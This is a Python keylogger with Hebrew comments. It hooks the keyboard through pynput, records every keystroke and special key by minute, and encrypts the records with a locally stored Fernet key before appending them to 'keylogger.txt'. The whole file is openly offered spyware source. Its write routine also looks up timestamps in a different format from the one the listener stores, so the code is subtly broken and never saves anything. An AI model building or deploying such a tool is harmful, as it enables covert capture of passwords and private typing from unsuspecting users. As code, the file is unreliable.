from pynput.keyboard import Listener, Key
from datetime import datetime
from cryptography.fernet import Fernet
import threading
import os

# === הצפנה ===

# צור מפתח פעם אחת ושמור לקובץ (רק אם לא קיים)
key_file = "encryption.key"
if not os.path.exists(key_file):
    key = Fernet.generate_key()
    with open(key_file, "wb") as f:
        f.write(key)
else:
    with open(key_file, "rb") as f:
        key = f.read()

fernet = Fernet(key)

# מילון שבו נשמור לחיצות מקשים לפי זמן (פורמט 'שעה:דקה')
logs_by_minute = {}

# עדכון הקובץ כל 60 שניות
def write_to_file_every_minute():
    threading.Timer(60.0, write_to_file_every_minute).start()

    now = datetime.now().strftime("%Y-%m-%d %H:%M")
    if now in logs_by_minute and logs_by_minute[now]:
        log_entry = f"\n=== {now} ===\n{logs_by_minute[now]}"
        encrypted_log = fernet.encrypt(log_entry.encode())

        with open("keylogger.txt", "ab") as file:  # מצב כתיבה בינארי
            file.write(encrypted_log + b"\n")

        logs_by_minute[now] = ''  # ננקה אחרי שמירה

# התחלת השעון
write_to_file_every_minute()

def keylogger(key):
    now = datetime.now().strftime("%H:%M")

    try:
        key_str = key.char
    except AttributeError:
        if key == Key.space:
            key_str = ' '
        elif key == Key.enter:
            key_str = '\n'
        elif key == Key.tab:
            key_str = '\t'
        elif key == Key.backspace:
            key_str = '[BACKSPACE]'
        elif key in (Key.ctrl_l, Key.ctrl_r):
            key_str = '[CTRL]'
        elif key in (Key.alt_l, Key.alt_r):
            key_str = '[ALT]'
        elif key == Key.esc:
            key_str = '[ESC]'
        elif key == Key.up:
            key_str = '[UP]'
        elif key == Key.down:
            key_str = '[DOWN]'
        elif key == Key.left:
            key_str = '[LEFT]'
        elif key == Key.right:
            key_str = '[RIGHT]'
        else:
            key_str = f'[{key}]'

    if now not in logs_by_minute:
        logs_by_minute[now] = ''
    logs_by_minute[now] += str(key_str)

with Listener(on_press=keylogger) as listener:
    listener.join()
